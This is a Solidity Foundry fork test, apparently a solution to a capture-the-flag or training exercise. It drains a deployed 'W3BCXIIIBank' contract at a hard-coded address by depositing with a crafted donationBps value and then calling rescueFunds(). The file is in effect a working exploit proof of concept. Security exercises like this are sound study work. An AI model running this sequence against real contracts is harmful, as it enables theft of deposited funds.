// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

// Your Goal is to write a fork test to prove how you can manipulate this coontract from a user perspective
// And drain all the funds in this contract
// Note: I said using a fork test!!!

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
// import {W3BCXIIIBank} from "../src/hackops.sol";
interface IW3BCXIIIBank {
    function deposit(address receiver, uint256 donationBps) external payable;
    function rescueFunds() external;
    function viewDeposit(address account) external view returns (uint256);
    function feeBps() external view returns (uint256);
}

contract W3BCXIIIBankTest is Test {
    IW3BCXIIIBank bank;
    // address owner;
    address hacker;

    function setUp() public {
        // owner = address(0x2188129391823);
        hacker = address(0x1234);
        // vm.startPrank(owner);
        bank = IW3BCXIIIBank(0xdf34147707762e0B264abbe9F476f02790B9C12C);
        // vm.stopPrank();
        // vm.deal(address(bank),0.1 ether);
    }

    function test_userHackerCanWithdraw() public {
        vm.deal(hacker, 10_000 wei);
        console.log("hacker balance before: ", address(hacker).balance);
        console.log("contract balance before: ", address(bank).balance);
        vm.startPrank(hacker);
        bank.deposit{value: 10000 wei}(hacker, 6860);
        bank.rescueFunds();
        vm.stopPrank();
        console.log("hacker balance after: ", address(hacker).balance);
        console.log("contract balance: ", address(bank).balance);
        assertGt(hacker.balance, 1000 wei);
        assertTrue(address(bank).balance==0);
    }
}
